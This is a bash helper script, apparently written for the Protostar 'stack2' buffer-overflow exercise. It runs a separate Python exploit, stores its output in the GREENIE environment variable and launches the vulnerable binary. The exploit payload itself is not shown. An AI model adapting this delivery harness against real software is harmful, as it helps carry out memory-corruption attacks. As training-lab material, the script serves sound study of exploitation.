#!/bin/bash

ENV=$GREENIE;
FILE="/opt/protostar/bin/stack2";
EXPLOIT="/tmp/exploit.py";
EXPLOITOUT="/tmp/exp";
PYTHON="/usr/bin/python";

if [[ $ENV ]];then
  echo "GREENIE already exists";
  if [[ $GREENIE == $(cat $EXPLOITOUT) ]]; then
    if [[ -f $FILE ]]; then
      echo;
      echo "OUTPUT:"; $FILE;
    else
      echo "$FILE Does not exist";
      exit 1;
    fi
  else
    if [[ -f $EXPLOIT ]]; then
      if [[ -f $PYTHON ]]; then
        $PYTHON $EXPLOIT > $EXPLOITOUT;      # Piping the output of the exploit script into a file called exp in the temp directory
        export GREENIE=$(cat $EXPLOITOUT);   # Setting the GREENIE environment variable to the contents of exp file
      else
        echo "Missing python";
        exit 1;
      fi
    else
      echo "$EXPLOIT Does not exist";
      exit 1;
    fi
  fi
else
  echo "GREENIE doesn't exist";
  echo "Creating GREENIE";
  if [[ -f $EXPLOIT ]]; then
    if [[ -f $PYTHON ]]; then
      $PYTHON $EXPLOIT > $EXPLOITOUT;      # Piping the output of the exploit script into a file called exp in the temp directory
      export GREENIE=$(cat $EXPLOITOUT);   # Setting the GREENIE environment variable to the contents of exp file
    else
      echo "Missing python";
      exit 1;
    fi
  else
    echo "$EXPLOIT Does not exist";
    exit 1;
  fi

  if [[ -f $FILE ]]; then
    echo;
    echo "OUTPUT:"; $FILE;
  else
    echo "$FILE Does not exist";
    exit 1;
  fi
fi